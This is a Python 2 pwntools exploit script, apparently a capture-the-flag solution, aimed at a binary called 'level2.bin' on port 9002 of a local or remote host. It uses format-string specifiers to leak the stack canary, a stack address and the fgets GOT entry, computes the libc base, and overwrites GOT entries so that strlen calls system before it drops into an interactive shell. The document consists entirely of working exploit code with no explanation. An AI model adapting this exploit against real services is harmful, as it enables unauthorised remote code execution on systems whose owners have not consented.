#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF ('libc.so')
else:
    DEBUG = True
    libc = ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')

b = ELF('level2.bin')
context.log_level = 'info'

###

if DEBUG:
    r = remote('localhost', 9002)
else:
    r = remote('34.198.96.6', 9002)


r.recvuntil('Enter name: ')
r.sendline('%83$p%2$p%37$.4s' + p32(b.symbols['got.fgets']))
r.recvuntil('Enter password: ')
r.sendline('toto')
r.recvuntil('Invalid password for username: ')
ssp = int(r.recv(10)[2:], 16)
stack = int(r.recv(10)[2:], 16)
eip = stack + 0xd8
leak = u32(r.recvline().rstrip().ljust(4, '\x00')[0:4])
libcbase = leak - libc.symbols['fgets']
log.info('ssp: %#x' % leak)
log.info('stack: %#x' % stack)
log.info('eip: %#x' % eip)
log.info('fgets.got: %#x' % leak)
log.info('libcbase: %#x' % libcbase)

r.recvuntil('Enter password: ')
write = {b.symbols['got.__stack_chk_fail']: b.symbols['validate'], b.symbols['got.strlen']: libcbase + libc.symbols['system']}
p  = 'Nullcon20170'
p += fmtstr_payload(11, write, numbwritten=63, write_size='short')
p += 'A' * 32
r.sendline(p)
r.recvuntil('Enter password: ')
r.interactive()
